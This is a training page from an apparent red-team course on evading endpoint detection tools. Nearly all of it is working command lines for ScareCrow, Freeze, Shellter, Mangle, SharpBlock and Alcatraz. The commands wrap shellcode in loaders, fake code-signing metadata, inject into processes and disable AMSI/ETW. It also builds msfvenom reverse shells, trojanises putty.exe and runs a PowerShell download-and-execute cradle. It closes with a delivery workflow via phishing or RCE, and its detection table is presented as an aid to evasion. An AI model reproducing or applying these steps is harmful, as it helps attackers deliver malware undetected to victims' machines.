---
layout: training-page
title: "EDR Bypass Tools — Red Team Academy"
module: "Evasion"
tags:
  - edr-bypass
  - scarecrow
  - freeze
  - shellter
  - mangle
  - sharpblock
  - alcatraz
page_key: "evasion-edr-bypass-tools"
render_with_liquid: false
---

# EDR Bypass Tools

## The Modern Detection Landscape

Endpoint Detection and Response (EDR) products — CrowdStrike, SentinelOne, Carbon Black, Defender for Endpoint — have fundamentally changed offensive operations. Static signatures alone stopped working years ago. Modern EDRs combine:

- **Behavioral monitoring**: suspicious process chains, memory injection patterns
- **Kernel callbacks**: process creation, image load, registry modification notifications
- **User-mode hooks**: NTDLL hooks intercept API calls before they reach the kernel
- **Memory scanning**: runtime scanning for shellcode signatures
- **Telemetry**: every process, network connection, and file operation sent to cloud analysis

Bypassing these requires a layered approach: obfuscate the payload, evade memory scanning, unhook userland hooks, and avoid triggering behavioral signatures. The tools below each address different parts of this problem.

## ScareCrow — Payload Delivery Framework

ScareCrow generates shellcode loaders that bypass EDR detection by abusing code signing, process injection, and AMSI/ETW bypass techniques. It wraps raw shellcode in convincing, signed-looking binaries.

### Installation

```bash
git clone https://github.com/optiv/ScareCrow
cd ScareCrow
go build ScareCrow.go
```

### Dependencies

```bash
# Required for Windows binaries (cross-compile from Linux)
apt install osslsigncode mingw-w64

# Required for code signing bypass
git clone https://github.com/secretsquirrel/the-backdoor-factory
```

### Basic Usage

```bash
# Generate shellcode loader from raw shellcode
./ScareCrow -I beacon.bin -Loader binary -domain microsoft.com

# DLL loader (for DLL hijacking delivery)
./ScareCrow -I beacon.bin -Loader dll -domain zoom.us

# Control Panel applet (.cpl)
./ScareCrow -I beacon.bin -Loader control -domain adobe.com

# With self-deletion after execution
./ScareCrow -I beacon.bin -Loader binary -domain microsoft.com -kill
```

### Signing Bypass

ScareCrow steals legitimate code signing cert metadata (not the private key — the cert details) to make binaries *appear* signed:

```bash
# Use certificate from a legitimate binary to fake signing metadata
./ScareCrow -I beacon.bin -Loader binary \
  -domain microsoft.com \
  -sign /path/to/legit.exe \
  -password ""
```

### Injection Methods

```bash
# Process injection into explorer.exe
./ScareCrow -I beacon.bin -Loader binary \
  -injection explorer.exe \
  -domain microsoft.com

# ETW bypass
./ScareCrow -I beacon.bin -Loader binary -etw -domain microsoft.com

# AMSI bypass included by default in most loaders
```

## Freeze — Payload Creation with AMSI/ETW Bypass

Freeze is a Go-based payload creation tool that generates executables, DLLs, and shellcode runners with built-in AMSI bypass, ETW patching, and sandbox detection.

### Installation

```bash
git clone https://github.com/optiv/Freeze
cd Freeze
go build Freeze.go
```

### Usage

```bash
# Basic binary loader from Cobalt Strike shellcode
./Freeze -I beacon.bin -O loader.exe

# DLL loader
./Freeze -I beacon.bin -O loader.dll -O-DLL

# Encrypt payload (XOR)
./Freeze -I beacon.bin -O loader.exe -encrypt

# Process injection into specific process
./Freeze -I beacon.bin -O loader.exe -inject svchost.exe

# Sandbox evasion (sleep, check process list)
./Freeze -I beacon.bin -O loader.exe -sandbox

# COM object injection
./Freeze -I beacon.bin -O loader.exe -COM
```

### Loader Types

```bash
# Self-contained binary
./Freeze -I beacon.bin -O loader.exe -console

# Service DLL (for service-based persistence)
./Freeze -I beacon.bin -O service.dll -service

# Shellcode runner template
./Freeze -I beacon.bin -O runner.exe -template
```

## Shellter — Dynamic PE Shellcode Injection

Shellter is a dynamic PE infection tool. It injects shellcode into legitimate Windows binaries, using the original binary's execution flow to deliver and run the shellcode. The infected binary still functions normally — opening Notepad, then executing your beacon in the background.

### Installation

```bash
# Kali/Parrot
apt install shellter

# Or download directly
# https://www.shellterproject.com/download/
```

### Usage (Wine on Linux)

```bash
# Shellter runs as a Windows binary — use Wine on Linux
wine shellter.exe

# Interactive mode walks you through:
# 1. Choose PE target (e.g., /usr/share/windows-resources/binaries/putty.exe)
# 2. Auto or manual injection mode
# 3. Select shellcode (built-in: Meterpreter, Beacon; or custom raw)
# 4. Output: infected PE

# Non-interactive (stealth mode)
wine shellter.exe -a -f putty.exe -s msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444
```

### Custom Shellcode

```bash
# Generate raw shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw > beacon.bin

# Inject into legitimate binary
wine shellter.exe -a -f putty.exe --custom -c beacon.bin
```

## Mangle — PE Header and Signature Manipulation

Mangle modifies PE file characteristics to defeat signature-based detection. It strips, randomizes, or modifies headers, sections, and import tables to make a malicious binary harder to identify.

### Installation

```bash
git clone https://github.com/optiv/Mangle
cd Mangle
go build Mangle.go
```

### Usage

```bash
# Basic PE manipulation
./Mangle -I malicious.exe -O clean.exe

# Overwrite PE header (breaks static analysis)
./Mangle -I malicious.exe -O clean.exe -overwrite

# Strip debug information
./Mangle -I malicious.exe -O clean.exe -strip

# Modify import table to masquerade as legitimate software
./Mangle -I malicious.exe -O clean.exe -import

# Clone header from legitimate binary
./Mangle -I malicious.exe -O clean.exe -clone legit.exe

# Combined — clone header + strip + modify imports
./Mangle -I malicious.exe -O clean.exe \
  -clone "C:\Windows\System32\notepad.exe" \
  -strip \
  -import
```

### Combining with ScareCrow

```bash
# Common workflow: ScareCrow wraps shellcode, Mangle cleans the output
./ScareCrow -I beacon.bin -Loader binary -domain microsoft.com -O loader-raw.exe
./Mangle -I loader-raw.exe -O loader-final.exe -clone notepad.exe -import
```

## SharpBlock — In-Memory EDR Bypass

SharpBlock works at runtime rather than build time. It's a C# tool that blocks EDR DLLs from loading into the process by hooking the DLL loading mechanism, effectively preventing EDR user-mode hooks from being installed.

### Usage

SharpBlock is typically used as a wrapper for your payload:

```bash
# Block EDR DLLs and execute target binary
SharpBlock.exe -e notepad.exe -b "SentinelOne.dll" -b "CrowdStrike.dll"

# With arbitrary command execution
SharpBlock.exe -e cmd.exe -a "/c whoami" -b "CbDefenseDll.dll"

# Block by EDR vendor detection
SharpBlock.exe -e powershell.exe -a "-c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1/payload.ps1')" --edr CrowdStrike

# From Cobalt Strike (execute-assembly)
execute-assembly /path/to/SharpBlock.exe -e beacon.exe
```

### How It Works

SharpBlock intercepts `CreateProcess` calls and uses the `lpApplicationName` bypass technique — spawning the child process in a suspended state, then using an alternate loader that respects the EDR exclusion list before the process fully initializes.

## Alcatraz — PE Obfuscator

Alcatraz is an x64 PE binary obfuscator that applies multiple transformations to defeat static analysis:

- Instruction mutation
- Opaque predicates
- Control flow flattening
- String encryption
- Import table obfuscation

### Installation

```bash
git clone https://github.com/weak1337/Alcatraz
# Build with Visual Studio on Windows (MSVC required)
```

### Usage

```bash
# Obfuscate a binary (Windows — run on attacker Windows box)
Alcatraz.exe malicious.exe output-obfuscated.exe

# Obfuscate with all options
Alcatraz.exe malicious.exe output.exe \
  --mutation-level 3 \
  --flatten \
  --encrypt-strings \
  --junk-code
```

## Defensive Detection of These Tools

Understanding how defenders detect these tools informs better evasion:

| Tool | Detection Method |
|---|---|
| ScareCrow | Invalid/stolen code signing certs; memory-resident shellcode patterns |
| Freeze | Behavioral: AMSI patching in-memory; ETW patchbytes |
| Shellter | PE section entropy analysis; IAT anomalies |
| Mangle | Import table inconsistencies; PE header checksum mismatch |
| SharpBlock | Suspicious DLL load sequence; inline hook detection |
| Alcatraz | High section entropy; unusual instruction patterns |

## Recommended Workflow

```
1. Generate raw shellcode (Cobalt Strike, Havoc, Sliver)
       ↓
2. Wrap with Freeze (AMSI/ETW bypass, sandbox detection)
       ↓
3. Apply ScareCrow loader (code signing appearance, process injection)
       ↓
4. Run through Mangle (header clone, import manipulation)
       ↓
5. Test against AV/EDR in isolated lab before deployment
       ↓
6. Deliver via phishing, RCE, or physical access
```

Always test against a representative sample of the target's security stack. A bypass against Defender doesn't guarantee bypass against CrowdStrike Falcon.
